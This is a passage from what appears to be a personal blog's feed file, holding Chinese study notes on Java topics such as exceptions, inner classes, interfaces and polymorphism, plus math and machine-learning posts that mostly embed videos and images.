class="params">()</span></span>&#123;&#125; <span class="comment">//无参构造器 会自动产生最方便</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">newException</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-6-printStackTrace-："><a href="#12-6-printStackTrace-：" class="headerlink" title="12.6 printStackTrace()："></a>12.6 printStackTrace()：</h2><blockquote><p><strong>将打印“从方法调用处直到异常抛出处”的方法调用序列</strong><br><strong>printStackTrace（）信息可由getStackTrace（）直接访问</strong></p><ul><li><strong>返回一个栈数组，栈顶是最后一个调用的方法，栈底是第一个调用的方法</strong></li></ul></blockquote><h3 id="12-6-3-异常链"><a href="#12-6-3-异常链" class="headerlink" title="12.6.3 异常链"></a>12.6.3 异常链</h3><blockquote><p><strong>在捕获一个异常后抛出另一个异常，把原始异常信息保存起来，为异常链</strong><br><strong>异常链写法：</strong></p><ol><li><strong>将catch到的异常对象作为cause参数放入构造器传递给下一个异常</strong></li><li><strong>创建异常对象实例化后用initCause（原始异常对象）</strong></li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testOne</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;第一个异常&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testTwo</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">testOne();</span><br><span class="line">&#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;第二个异常&quot;</span>,e);</span><br><span class="line">        <span class="comment">/*    写法二：</span></span><br><span class="line"><span class="comment">        Exception e1 = new IOException(&quot;第二个异常&quot;);</span></span><br><span class="line"><span class="comment">        e1.initCause(e);</span></span><br><span class="line"><span class="comment">        throw e1;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">testTwo();</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="12-8-finally"><a href="#12-8-finally" class="headerlink" title="12.8 finally"></a>12.8 finally</h2><p><strong>除了System.exit(1)以外，其他任何情况都会执行finally，甚至跳过break，continue，return等语句。</strong></p>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Beta分布详解</title>
      <link href="/2021/06/14/Beta%E5%88%86%E5%B8%83_(4)/"/>
      <url>/2021/06/14/Beta%E5%88%86%E5%B8%83_(4)/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1a54y1z7a8&cid=257887173&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe>]]></content>
      
      
      <categories>
          
          <category> MATH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据增广：mixup详解</title>
      <link href="/2021/06/14/mixup__BEYOND_EMPIRICAL_RISK_MINIMIZATION_(1)/"/>
      <url>/2021/06/14/mixup__BEYOND_EMPIRICAL_RISK_MINIMIZATION_(1)/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV14K4y1Y7S7&cid=226900007&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><ul><li>得到更多数据</li><li>可以增强gans的稳定性</li></ul><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p><img src="http://img04.sogoucdn.com/app/a/100540022/2021061518321982686462.png"><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/175039/14/14586/39853/60c69d35Ef86ea14d/08573e5e1e1c8160.png"></p><h1 id="变种"><a href="#变种" class="headerlink" title="变种"></a>变种</h1><ul><li>Mixup manifold Mixup CutMix</li><li>AugMix</li><li>SuperMix</li><li>Puzzle Mix</li><li>Adaptive Mixup</li><li>Mixup+SemiSL-&gt;MixMatch</li><li>Mixup+Defense-&gt;Mixup Inference.</li></ul>]]></content>
      
      
      <categories>
          
          <category> PAPER </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率密度函数(PDF)详解</title>
      <link href="/2021/06/14/%E6%A6%82%E7%8E%87%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0%EF%BC%88PDF%EF%BC%89%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/06/14/%E6%A6%82%E7%8E%87%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0%EF%BC%88PDF%EF%BC%89%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1ga4y147sC&cid=180171176&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe>]]></content>
      
      
      <categories>
          
          <category> MATH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贝叶斯定理,使概率论直觉化</title>
      <link href="/2021/06/14/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%AE%9A%E7%90%86%EF%BC%8C%E4%BD%BF%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9B%B4%E8%A7%89%E5%8C%96/"/>
      <url>/2021/06/14/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%AE%9A%E7%90%86%EF%BC%8C%E4%BD%BF%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9B%B4%E8%A7%89%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1R7411a76r&cid=145676762&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><a name="znVDE"></a># 简洁证明<iframe src="//player.bilibili.com/player.html?bvid=BV1o7411a76m&cid=145676706&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe>]]></content>
      
      
      <categories>
          
          <category> MATH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第10章 内部类</title>
      <link href="/2021/06/13/%E7%AC%AC10%E7%AB%A0_%E5%86%85%E9%83%A8%E7%B1%BB/"/>
      <url>/2021/06/13/%E7%AC%AC10%E7%AB%A0_%E5%86%85%E9%83%A8%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="内部类的好处："><a href="#内部类的好处：" class="headerlink" title="内部类的好处："></a>内部类的好处：</h2><ul><li><strong>将类的代码隐藏在其他类内部。</strong></li><li><strong>内部类对象可以访问外部类的所有元素</strong> <strong>。</strong></li><li><strong>解决多继承的问题。</strong></li><li><strong>内部类可以有多个实例，与外部类独立。</strong></li><li><strong>单个外部类可以让多个内部类实现同一个接口或继承同一个类。</strong></li></ul><h2 id="一、成员内部类"><a href="#一、成员内部类" class="headerlink" title="一、成员内部类:"></a>一、成员内部类:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取内部类对象实例的方式"><a href="#获取内部类对象实例的方式" class="headerlink" title="获取内部类对象实例的方式"></a>获取内部类对象实例的方式</h3><ul><li><strong>普通内部类对象隐式的保存了一个指向外部类对象的引用。</strong></li><li><strong>new 外部类 . new 内部类。</strong></li><li><strong>外部类对象 . new 内部类。</strong></li><li><strong>外部类对象 . get方法。</strong></li></ul><h3 id="10-3-使用-this和-new"><a href="#10-3-使用-this和-new" class="headerlink" title="10.3 使用.this和.new"></a>10.3 使用.this和.new</h3><ul><li><strong>内部类中获取外部类对象的引用：外部类.this 。</strong></li><li><strong>外部类中访问内部类对象的引用：new 内部类()。</strong></li><li><strong>外部类中创建内部类对象必须使用外部类对象来创建内部类对象。</strong><ul><li><strong><img src="https://img14.360buyimg.com/ddimg/jfs/t1/186931/40/8122/34987/60c75aa2Ec2f56c51/0e6a607f34a6dd50.jpg" alt="image.png"></strong></li></ul></li></ul><h3 id="10-4-内部类和向上转型"><a href="#10-4-内部类和向上转型" class="headerlink" title="10.4 内部类和向上转型"></a>10.4 内部类和向上转型</h3><p><strong>内部类也可以和普通类一样拥有向上转型的特性。将内部类向上转型为基类型，尤其是接口时，内部类就有了用武之地。如果内部类是private的，只可以被它的外部类问，从而完全隐藏实现的细节。</strong></p><hr><h2 id="二、10-5-方法内部类"><a href="#二、10-5-方法内部类" class="headerlink" title="二、10.5 方法内部类"></a>二、10.5 方法内部类</h2><ul><li><p><strong>方法中创建类。</strong></p></li><li><p><strong>类前不能加访问说明符，类中不能有静态成员。</strong></p></li><li><p><strong>可以访问代码块内的常量和外部类的所有成员。</strong></p><h3 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h3></li><li><p><strong>实现了某接口，创建并返回对其的引用。</strong></p></li><li><p><strong>需要创建一个类辅助解决问题，但不希望这个类公共可用。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object getInner&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="三、10-6-匿名内部类"><a href="#三、10-6-匿名内部类" class="headerlink" title="三、10.6 匿名内部类"></a>三、10.6 匿名内部类</h2><h3 id="使用场景：-1"><a href="#使用场景：-1" class="headerlink" title="使用场景："></a>使用场景：</h3><ul><li><strong>只用到类的一个实例，因为不会有对象名称，无法再次调用。</strong></li><li><strong>实例化的同时重写方法，等同于创建子类继承父类并重写方法或实现接口。</strong></li><li><strong>没有静态成员</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test.getRead(<span class="keyword">new</span> Person()&#123; <span class="comment">//实例化的同时重写方法，等同于创建子类继承父类并重写方法。</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="四、10-7-静态内部类（嵌套类）"><a href="#四、10-7-静态内部类（嵌套类）" class="headerlink" title="四、10.7 静态内部类（嵌套类）"></a>四、10.7 静态内部类（嵌套类）</h2><h3 id="使用场景：-2"><a href="#使用场景：-2" class="headerlink" title="使用场景："></a>使用场景：</h3><ul><li><p><strong>不需要内部类对象与外部类有联系。</strong></p><h3 id="与普通内部类的区别："><a href="#与普通内部类的区别：" class="headerlink" title="与普通内部类的区别："></a>与普通内部类的区别：</h3></li><li><p><strong>普通内部类对象隐式的保存了一个指向外部类对象的引用，而静态内部类没有。</strong></p></li><li><p><strong>静态内部类创建对象不需要外部类对象。</strong></p></li><li><p><strong>普通内部类不能有static成员，而静态内部类可以。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>静态内部类中，不能通过对象访问非静态的外部类对象。</strong></p></li><li><p><strong>创建静态内部类对象：外部类.内部类 类名 = new 外部类.内部类();</strong></p></li></ul><h3 id="10-7-1-接口内部可以放静态内部类"><a href="#10-7-1-接口内部可以放静态内部类" class="headerlink" title="10.7.1 接口内部可以放静态内部类"></a>10.7.1 接口内部可以放静态内部类</h3><p><strong>正常情况接口内部不能放代码，但是静态内部类可以放，自动的public和static。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="10-9-内部类的继承"><a href="#10-9-内部类的继承" class="headerlink" title="10.9 内部类的继承"></a>10.9 内部类的继承</h3><p><strong>内部类对象隐式的包含对外部类对象的引用，所以在继承内部类的同时，构造器需要通过特殊语法初始化这个引用。</strong></p><ul><li><strong>外部类对象 . super()</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">Outer</span>,<span class="title">Inner</span></span>&#123;</span><br><span class="line">    <span class="comment">// A()&#123;&#125;不能通过编译。 必须通过外部类对象.super初始化内部类对象对外部类对象的引用。</span></span><br><span class="line">A(Outer o)&#123;</span><br><span class="line">    o.<span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第9章 接口</title>
      <link href="/2021/06/12/%E7%AC%AC9%E7%AB%A0_%E6%8E%A5%E5%8F%A3/"/>
      <url>/2021/06/12/%E7%AC%AC9%E7%AB%A0_%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="9-1-抽象类和抽象方法"><a href="#9-1-抽象类和抽象方法" class="headerlink" title="9.1 抽象类和抽象方法"></a>9.1 抽象类和抽象方法</h2><p><strong>含有抽象方法的类叫做抽象类</strong> <strong>。</strong><br><strong><code>abstract class name&#123;...``&#125;</code></strong></p><h3 id="抽象方法的特征"><a href="#抽象方法的特征" class="headerlink" title="抽象方法的特征"></a>抽象方法的特征</h3><ul><li><strong>抽象方法不允许有方法体，只能以分号“;”结尾</strong> 。</li><li><strong>抽象方法只能声明在抽象类中</strong> 。</li><li><strong>抽象类中可以包含0个或多个抽象方法。</strong></li><li><strong>抽象方法必须被子类实现</strong> 。</li><li><strong>如果子类不能实现父类中的抽象方法，那么子类也必须是抽象类</strong> 。<h3 id="什么情况下使用抽象方法和抽象类"><a href="#什么情况下使用抽象方法和抽象类" class="headerlink" title="什么情况下使用抽象方法和抽象类"></a>什么情况下使用抽象方法和抽象类</h3></li></ul><p><strong>父类的名称比较抽象，创建对象无意义。</strong></p><h2 id="9-2-接口"><a href="#9-2-接口" class="headerlink" title="9.2 接口"></a>9.2 接口</h2><p><strong>比抽象类更抽象。</strong><br><strong><code>interface A&#123;...&#125;</code></strong><br><strong><code>class B implements A&#123;...&#125;</code></strong><br><strong>接口中的变量隐式的指定为static和final</strong> ， <strong>没有方法体 。</strong></p><h3 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h3><ul><li><strong>抽象类只能单继承,接口能多实现</strong> 。</li><li><strong>抽象类是一个类,可以被任意权限修饰符修饰,静态和非静态属性，final和非final属性，可以有抽象方法和非抽象方法</strong></li><li><strong>接口只能被public,final修饰,只能有静态方法,即使没有显示的声明，而且是不可修改的；</strong></li><li><strong>抽象类是对类的抽象，接口是对行为的抽象。</strong></li><li><strong>设计抽象类是自下而上的过程,我子类需要,所以我定义抽象类；而设计接口是自上而下的过程,我接口规范某一行为,我某类需要这个行为,我实现某接口；</strong></li></ul><p><strong>核心区别:</strong><br><strong>调用者使用动机不同,实现接口是为了使用他规范的某一个行为；</strong><br><strong>继承抽象类是为了使用这个类属性和行为.</strong></p><p><strong>再简单点说:</strong><br><strong>我们知道抽象类是从子类中发现公共部分，然后泛化成抽象类，子类继承该父类即可，但是接口不同。实现它的子类可以不存在任何关系，共同之处。例如猫、狗可以抽象成一个动物类抽象类，具备叫的方法。鸟、飞机可以实现飞Fly接口，具备飞的行为，这里我们总不能将鸟、飞机共用一个父类吧！所以说抽象类所体现的是一种继承关系，要想使得继承关系合理，父类和派生类之间必须存在”is-a” 关系，即父类和派生类在概念本质上应该是相同的。对于接口则不然，并不要求接口的实现者和接口定义在概念本质上是一致的， 仅仅是实现了接口定义的规则而已。</strong></p>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第7章 复用类</title>
      <link href="/2021/06/11/%E7%AC%AC7%E7%AB%A0_%E5%A4%8D%E7%94%A8%E7%B1%BB/"/>
      <url>/2021/06/11/%E7%AC%AC7%E7%AB%A0_%E5%A4%8D%E7%94%A8%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="7-1-当需要String时，编译器会自动调用toString"><a href="#7-1-当需要String时，编译器会自动调用toString" class="headerlink" title="7.1 当需要String时，编译器会自动调用toString()"></a>7.1 <strong>当需要String时，编译器会自动调用toString()</strong></h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/187768/8/8156/173809/60c758caE0235709d/c47a625b496f5f12.jpg"></p><h2 id="7-2-导出类构造器和基类构造器"><a href="#7-2-导出类构造器和基类构造器" class="headerlink" title="7.2 导出类构造器和基类构造器"></a>7.2 导出类构造器和基类构造器</h2><p><strong>所有的类都可以含有main方法，无需删除，方便单元测试。</strong></p><ul><li><strong>创建从基类继承的类的对象会先执行基类构造器，然后再执行继承类的构造器<strong><strong>，所以导出类构造器中必须带有基类构造器</strong></strong>。</strong><ul><li><strong>若想要在继承类中调用基类的带参数的构造器，需要使用super关键字****。</strong></li><li><img src="https://img14.360buyimg.com/ddimg/jfs/t1/193139/8/8169/55490/60c758e4E6a6e76af/a9bf8344bb31fa8d.jpg"><h2 id="7-6-protected-关键字"><a href="#7-6-protected-关键字" class="headerlink" title="7.6 protected 关键字"></a>7.6 protected 关键字</h2><img src="https://img11.360buyimg.com/ddimg/jfs/t1/187016/1/8186/58893/60c7591bEee00236c/a0654b60d7f66a72.jpg"><h2 id="7-7-向上转型"><a href="#7-7-向上转型" class="headerlink" title="7.7 向上转型"></a>7.7 向上转型</h2></li></ul></li></ul><p><strong>导出类对象自动提升到基类对象，向上转型是安全的，只会丢失方法。</strong><br><strong><img src="https://img10.360buyimg.com/ddimg/jfs/t1/184299/24/9164/118703/60c75937E35962a8e/609ac1042d2790ce.jpg"></strong><br>**</p><h3 id="7-7-2-再论继承与组合"><a href="#7-7-2-再论继承与组合" class="headerlink" title="7.7.2 再论继承与组合"></a>7.7.2 再论继承与组合</h3><p><strong>使用继承还是组合最清晰的办法就是要不要向上转型。如果要向上转型，那继承是必要的。如果不需要，再好好考虑</strong> <strong>。</strong></p><h2 id="7-8-final关键字"><a href="#7-8-final关键字" class="headerlink" title="7.8 final关键字"></a>7.8 final关键字</h2><h3 id="7-8-1-final-数据"><a href="#7-8-1-final-数据" class="headerlink" title="7.8.1 final 数据"></a>7.8.1 final 数据</h3><ul><li><p><strong>若是基本数据类型则值不变</strong> 。</p></li><li><p><strong>若是对象引用则引用不变，一旦被初始化，则无法再指向另一个对象，对象自身可以修改</strong> <strong>。</strong></p></li><li><p><strong>既是static又是final的变量用大写表示。</strong></p><h3 id="final-参数"><a href="#final-参数" class="headerlink" title="final 参数"></a>final 参数</h3></li><li><p><strong>方法的参数列表指定为final。基本数据类型值不能修改，引用对象不能更换指向。</strong></p><h3 id="7-8-2-final-方法"><a href="#7-8-2-final-方法" class="headerlink" title="7.8.2 final 方法"></a>7.8.2 final 方法</h3></li><li><p><strong>final方法不能重写</strong> <strong>。</strong></p></li><li><p><strong>private方法已经隐式的指定为final，不能重写。</strong></p></li><li><p>final方法可以关闭动态绑定 。</p><h3 id="7-8-3-final-类"><a href="#7-8-3-final-类" class="headerlink" title="7.8.3 final 类"></a>7.8.3 final 类</h3></li><li><p><strong>final类不能继承</strong> <strong>。</strong></p></li><li><p>final类中的变量可以选择final或者不final，但是方法不能重写 。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第8章 多态</title>
      <link href="/2021/06/11/%E7%AC%AC8%E7%AB%A0_%E5%A4%9A%E6%80%81/"/>
      <url>/2021/06/11/%E7%AC%AC8%E7%AB%A0_%E5%A4%9A%E6%80%81/</url>
      
        <content type="html"><![CDATA[<h2 id="8-2-绑定"><a href="#8-2-绑定" class="headerlink" title="8.2 绑定"></a>8.2 绑定</h2><p><strong>静态绑定和动态绑定</strong></p><ul><li><strong>绑定：一个方法的调用与方法所在的类关联起来。</strong></li><li><strong>静态绑定：在编译过程中就已经知道这个方法到底是哪个类中的方法。</strong></li><li><strong>动态绑定：运行时根据对象的类进行绑定。</strong></li></ul><p><strong>java中除了static和final方法（包括private），其他方法都是动态绑定</strong> <strong>。</strong></p><h3 id="8-2-1-向上转型"><a href="#8-2-1-向上转型" class="headerlink" title="8.2.1 向上转型"></a>8.2.1 向上转型</h3><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/185948/12/9082/119939/60c7597dE1e65c954/7e73954f040131b6.jpg"> <br>  <strong>s.draw()调用的是circle的draw()</strong></p><ul><li><strong>多态 = 向上转型 = 动态绑定 。</strong><ul><li><strong>静态方法不具有多态性</strong> 。<img src="https://img14.360buyimg.com/ddimg/jfs/t1/137541/24/19032/220254/60c759bbE03940af0/571a93e46206a98c.jpg"></li></ul></li></ul><h2 id="8-3-带main方法的类构造器继承调用顺序"><a href="#8-3-带main方法的类构造器继承调用顺序" class="headerlink" title="8.3 带main方法的类构造器继承调用顺序"></a>8.3 带main方法的类构造器继承调用顺序</h2><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189817/35/8121/74886/60c75a10E93f2cc8c/dc80047544e3a2fb.jpg"><br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/180763/28/9192/151689/60c75a29E195d704b/2c878cc1a1720461.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第6章 访问权限控制</title>
      <link href="/2021/06/10/%E7%AC%AC6%E7%AB%A0_%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/"/>
      <url>/2021/06/10/%E7%AC%AC6%E7%AB%A0_%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181179/18/9114/48938/60c7583eE281939e9/7e2ddeae94364274.jpg"></p><ul><li><strong>public：可以被所有其他类所访问。</strong></li><li><strong>private：只能被自己访问和修改。</strong></li><li><strong>protected：自身、子类及同一个包中类可以访问。</strong></li><li><strong>default：同一包中的类可以访问，声明时没有加修饰符，认为是friendly。</strong></li><li><strong>为了继承，通常把数据指定为private，方法为public</strong> <strong>。</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章 控制执行流程</title>
      <link href="/2021/06/07/%E7%AC%AC4%E7%AB%A0_%E6%8E%A7%E5%88%B6%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/"/>
      <url>/2021/06/07/%E7%AC%AC4%E7%AB%A0_%E6%8E%A7%E5%88%B6%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="4-4-foreach与for循环"><a href="#4-4-foreach与for循环" class="headerlink" title="4.4 foreach与for循环"></a>4.4 foreach与for循环</h2><ul><li><strong>foreach和for循环在数组遍历上，速度相当，for循环稍快。</strong></li><li><strong>在链表遍历上，foreach比for循环快很多。</strong></li><li><strong>foreach不能插入和删除操作。</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> java编程思想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章 初始化与清理</title>
      <link href="/2021/06/07/%E7%AC%AC5%E7%AB%A0_%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E6%B8%85%E7%90%86/"/>
      <url>/2021/06/07/%E7%AC%AC5%E7%AB%A0_%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E6%B8%85%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="5-1-构造器"><a href="#5-1-构造器" class="headerlink" title="5.1 构造器"></a>5.1 构造器</h2><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/186178/13/9202/31200/60c757f8E20e3c80e/ae27efe8cf40900e.jpg"></p><h2 id="5-2-重载"><a href="#5-2-重载" class="headerlink" title="5.2 重载"></a>5.2 重载</h2><ul><li><strong>重载方法必须拥有独一无二的参数列表，返回值不同不能作为区分重载的标志。</strong></li><li><strong>传入数据类型小于方法中的参数类型，会自动提升。如果没有char类型，会自动提升到int型。</strong></li><li><strong>传入数据类型大于方法中的参数类型，必须强制转换。</strong></li></ul><blockquote><h3 id="重载和重写的区别"><a href="#重载和重写的区别" class="headerlink" title="重载和重写的区别"></a>重载和重写的区别</h3><ul><li><strong>重载：在同一个类中相同名字的方法，参数列表不同。</strong></li><li><strong>重写：子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变。通过子类创建的实例对象调用这个方法时，将调用子类中的定义方法，这相当于把父类中定义的那个完全相同的方法给覆盖了。</strong></li></ul></blockquote><h2 id="5-3-默认构造器"><a href="#5-3-默认构造器" class="headerlink" title="5.3 默认构造器"></a>5.3 